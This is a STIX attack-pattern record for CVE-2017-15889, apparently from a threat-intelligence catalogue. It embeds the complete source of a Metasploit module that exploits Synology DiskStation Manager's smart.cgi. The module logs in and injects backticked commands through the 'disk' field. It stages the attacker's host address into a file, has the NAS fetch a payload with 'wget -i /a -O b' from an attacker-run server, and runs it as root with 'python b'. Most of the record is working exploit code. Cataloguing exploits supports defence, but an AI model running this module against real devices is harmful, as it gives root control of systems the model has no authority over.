{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a5a8cd95-0d66-4d16-a75f-b15cefbeb9f1",
    "created": "2024-08-14T17:02:54.360648Z",
    "modified": "2024-08-14T17:02:54.360652Z",
    "name": "Synology DiskStation Manager smart.cgi Remote Command Execution",
    "description": " This module exploits a vulnerability found in Synology DiskStation Manager (DSM) versions < 5.2-5967-5, which allows the execution of arbitrary commands under root privileges after website authentication. The vulnerability is located in webman/modules/StorageManager/smart.cgi, which allows appending of a command to the device to be scanned.  However, the command with drive is limited to 30 characters.  A somewhat valid drive name is required thus /dev/sd is used, even though it doesn't exist.  To circumvent the character restriction, a wget input file is staged in /a, and executed to download our payload to /b.  From there the payload is executed.  A wfsdelay is required to give time for the payload to download, and the execution of it to run. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/synology_dsm_smart_exec_auth.rb",
            "external_id": "synology_dsm_smart_exec_auth.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-15889"
        },
        {
            "source_name": "reference",
            "url": "https://ssd-disclosure.com/ssd-advisory-synology-storagemanager-smart-cgi-remote-command-execution/"
        },
        {
            "source_name": "reference",
            "url": "https://synology.com/en-global/security/advisory/Synology_SA_17_65_DSM"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  DEVICE_INFO_PATTERN = /major=(?<major>\\d+)&minor=(?<minor>\\d+)&build=(?<build>\\d+)\n                        &junior=\\d+&unique=synology_\\w+_(?<model>[^&]+)/x.freeze\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Synology DiskStation Manager smart.cgi Remote Command Execution',\n        'Description' => %q{\n          This module exploits a vulnerability found in Synology DiskStation Manager (DSM)\n          versions < 5.2-5967-5, which allows the execution of arbitrary commands under root\n          privileges after website authentication.\n          The vulnerability is located in webman/modules/StorageManager/smart.cgi, which\n          allows appending of a command to the device to be scanned.  However, the command\n          with drive is limited to 30 characters.  A somewhat valid drive name is required,\n          thus /dev/sd is used, even though it doesn't exist.  To circumvent the character\n          restriction, a wget input file is staged in /a, and executed to download our payload\n          to /b.  From there the payload is executed.  A wfsdelay is required to give time\n          for the payload to download, and the execution of it to run.\n        },\n        'Author' => [\n          'Nigusu Kassahun', # Discovery\n          'h00die' # metasploit module\n        ],\n        'References' => [\n          [ 'CVE', '2017-15889' ],\n          [ 'EDB', '43190' ],\n          [ 'URL', 'https://ssd-disclosure.com/ssd-advisory-synology-storagemanager-smart-cgi-remote-command-execution/' ],\n          [ 'URL', 'https://synology.com/en-global/security/advisory/Synology_SA_17_65_DSM' ]\n        ],\n        'Privileged' => true,\n        'Stance' => Msf::Exploit::Stance::Aggressive,\n        'Platform' => ['python'],\n        'Arch' => [ARCH_PYTHON],\n        'Targets' => [\n          ['Automatic', {}]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'PrependMigrate' => true,\n          'WfsDelay' => 10\n        },\n        'License' => MSF_LICENSE,\n        'DisclosureDate' => '2017-11-08'\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(5000),\n        OptString.new('TARGETURI', [true, 'The URI of the Synology Website', '/']),\n        OptString.new('USERNAME', [true, 'The Username for Synology', 'admin']),\n        OptString.new('PASSWORD', [true, 'The Password for Synology', ''])\n      ]\n    )\n  end\n\n  def check\n    vprint_status('Trying to detect installed version')\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'webman', 'info.cgi'),\n      'vars_get' => { 'host' => '' }\n    })\n\n    if res && (res.code == 200) && res.body =~ DEVICE_INFO_PATTERN\n      version = \"#{$LAST_MATCH_INFO[:major]}.#{$LAST_MATCH_INFO[:minor]}\"\n      build = $LAST_MATCH_INFO[:build]\n      model = $LAST_MATCH_INFO[:model].sub(/^[a-z]+/) { |s| s[0].upcase }\n      model = \"DS#{model}\" unless model =~ /^[A-Z]/\n    else\n      vprint_error('Detection failed')\n      return CheckCode::Unknown\n    end\n\n    vprint_status(\"Model #{model} with version #{version}-#{build} detected\")\n\n    case version\n    when '3.0', '4.0', '4.1', '4.2', '4.3', '5.0', '5.1'\n      return CheckCode::Appears\n    when '5.2'\n      return CheckCode::Appears if build < '5967-5'\n    end\n\n    CheckCode::Safe\n  end\n\n  def on_request_uri(cli, _request, cookie, token)\n    print_good('HTTP Server request received, sending payload')\n    send_response(cli, payload.encoded)\n    print_status('Executing payload')\n    inject_request(cookie, token, 'python b')\n  end\n\n  def inject_request(cookie, token, cmd = '')\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'webman', 'modules', 'StorageManager', 'smart.cgi'),\n      'cookie' => cookie,\n      'headers' => {\n        'X-SYNO-TOKEN' => token\n      },\n      'vars_post' => {\n        'action' => 'apply',\n        'operation' => 'quick',\n        'disk' => \"/dev/sd`#{cmd}`\"\n      }\n    })\n  end\n\n  def login\n    # If you try to debug login through the browser, you'll see that desktop.js calls\n    # ux-all.js to do an RSA encrypted login.\n    # Wowever in a stroke of luck Mrs. h00die caused\n    # a power sag while tracing/debugging the loging, causing the NAS to power off.\n    # when that happened, it failed to get the crypto vars, and defaulted to a\n    # non-encrypted login, which seems to work just fine.  greetz Mrs. h00die!\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'webman', 'login.cgi'),\n      'vars_get' => { 'enable_syno_token' => 'yes' },\n      'vars_post' => {\n        'username' => datastore['USERNAME'],\n        'passwd' => datastore['PASSWORD'],\n        'OTPcode' => '',\n        '__cIpHeRtExT' => '',\n        'client_time' => Time.now.to_i,\n        'isIframeLogin' => 'yes'\n      }\n    })\n    if res && %r{<div id='synology'>(?<json>.*)</div>}m =~ res.body\n      result = JSON.parse(json)\n\n      fail_with(Failure::BadConfig, 'Incorrect Username/Password') if result['result'] == 'error'\n      if result['result'] == 'success'\n        return res.get_cookies, result['SynoToken']\n      end\n\n      fail_with(Failure::Unknown, \"Unknown response: #{result}\")\n    end\n  end\n\n  def exploit\n    if datastore['SRVHOST'] == '0.0.0.0'\n      fail_with(Failure::BadConfig, 'SRVHOST must be set to an IP address (0.0.0.0 is invalid) for exploitation to be successful')\n    end\n\n    begin\n      print_status('Attempting Login')\n      cookie, token = login\n\n      start_service({\n        'Uri' => {\n          'Proc' => proc do |cli, req|\n            on_request_uri(cli, req, cookie, token)\n          end,\n          'Path' => '/'\n        }\n      })\n\n      print_status('Cleaning env')\n      inject_request(cookie, token, cmd = 'rm -rf /a')\n      inject_request(cookie, token, cmd = 'rm -rf b')\n      command = \"#{datastore['SRVHOST']}:#{datastore['SRVPORT']}\".split(//)\n      command_space = 22 - \"echo -n ''>>/a\".length\n      command_space -= 1\n      command.each_slice(command_space) do |a|\n        a = a.join('')\n        vprint_status(\"Staging wget with: echo -n '#{a}'>>/a\")\n        inject_request(cookie, token, cmd = \"echo -n '#{a}'>>/a\")\n      end\n      print_status('Requesting payload pull')\n      register_file_for_cleanup('/usr/syno/synoman/webman/modules/StorageManager/b')\n      register_file_for_cleanup('/a')\n      inject_request(cookie, token, cmd = 'wget -i /a -O b')\n      # at this point we let the HTTP server call the last stage\n      # wfsdelay should be long enough to hold out for everything to download and run\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-11-08",
    "x_mitre_platforms": [
        "['python']"
    ]
}